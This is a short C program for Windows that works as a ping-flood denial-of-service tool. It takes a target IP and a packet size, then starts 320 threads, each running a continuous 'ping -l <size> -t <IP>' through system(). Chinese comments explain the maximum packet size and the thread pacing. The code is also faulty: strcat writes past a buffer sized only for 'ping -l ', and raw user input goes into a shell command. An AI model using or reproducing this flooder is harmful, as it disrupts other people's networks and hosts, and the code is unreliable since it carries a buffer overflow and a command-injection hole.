#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <pthread.h>

char IP[30],data[30],ICMP[] = "ping -l ";

void *thread_1(void* a){
	system(ICMP);  //最高可以65500位元組   
} 
	 
int main(){ 
	pthread_t th;
	printf("輸入目標IP : ");
	scanf("%s",IP);
	printf("輸入封包大小 : ");
	scanf("%s",data);
	strcat(ICMP,data);
	strcat(ICMP," -t ");
	strcat(ICMP,IP);
	for(int pl=0;pl<320;pl++){         //一次開啟320線程 
        pthread_create(&th, NULL, thread_1, (void *)NULL); 
        Sleep(30);                     //降低瞬間值(每0.03秒增加1線程) 
    }
        while(1){}                     //維持程式執行緒(不可包含創建執行緒) 
	    return 0;
	} 
